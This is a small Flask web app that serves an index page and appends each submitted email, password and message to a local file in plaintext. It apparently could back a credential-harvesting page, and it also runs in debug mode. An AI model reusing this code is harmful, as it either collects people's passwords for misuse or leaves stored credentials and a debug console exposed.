from flask import Flask
from flask import request
from flask import send_file
# Define the path to the data folder
app = Flask(__name__)


@app.route("/")
def index():
    return send_file("index.html")


print("Index.html page id loaded...")


@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email", "N/A")
    password = request.form.get("password", "N/A")
    message = request.form.get("message", "N/A")
    print("Data collected And Writing data into txt file...")
    if request.method == 'POST':
        # Save the data to a text file
        with open("data.json", "a") as f:
            f.write(f"Email: {email}\nPassword: {password}\nMessage: {message}\n\n")
    print("Data added successfully...")
    return send_file("index.html")


if __name__ == "__main__":
    app.run(debug=True)
